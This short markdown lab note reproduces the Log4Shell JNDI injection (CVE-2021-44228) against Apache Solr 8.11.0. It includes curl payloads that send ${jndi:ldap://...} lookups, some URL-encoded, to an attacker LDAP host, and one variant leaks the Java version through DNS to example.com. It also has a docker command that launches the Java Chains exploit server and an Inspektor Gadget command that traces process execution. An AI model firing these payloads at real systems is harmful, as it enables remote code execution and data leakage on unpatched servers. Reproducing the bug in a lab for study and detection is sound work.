# Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228)

``` mermaid
flowchart TD
  javachains["Java Chains 10.244.0.57:8011 10.244.0.57:50389"]
  solr["Apache Solr v8.11.0 10.244.0.55:8983"]
  
  solr -- LDAP --> javachains
```

ldap://10.244.0.57:50389/b37308


```
curl -v 'http://localhost:8983/solr/admin/cores?action=${jndi:ldap://10.244.0.57:50389/b37308}'
curl -v "/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com}"
curl -v "http://localhost:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Ajava.version%7D.example.com%7D"
```

```
docker run -d \
  --name java-chains \
  --restart=always \
  -p 8011:8011 \
  -p 58080:58080 \
  -p 50389:50389 \
  -p 50388:50388 \
  -p 3308:3308 \
  -p 13999:13999 \
  -p 50000:50000 \
  -p 11527:11527 \
  -e CHAINS_AUTH=true \
  -e CHAINS_PASS= \
  javachains/javachains:latest
```

Open <http://localhost:8011/> in your web browser.

```
http://localhost:8983/solr/admin/cores
```
```
curl -v 'http://localhost:8983/solr/admin/cores?action=${jndi:ldap://127.0.0.1:8983/5f5b99}'
curl -v 'http://localhost:8983/solr/admin/cores?action=${jndi:ldap://127.0.0.1:8983/5f5b99}'
curl -v 'http://localhost:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A8983%2F5f5b99%7D'
```

```
k gadget run ghcr.io/inspektor-gadget/gadget/trace_exec:latest \
  --namespace solr \
  --output columns \
  --fields timestamp,proc.pid,proc.parent.pid,proc.comm,args,k8s.podName,k8s.namespace
```

## Further reading

* <https://nvd.nist.gov/vuln/detail/cve-2021-44228/>
* <https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228/>
* <https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/>
* <https://java-chains.vulhub.org/docs/module/jndi#jndibasicpayload>
* <https://github.com/apache/solr>
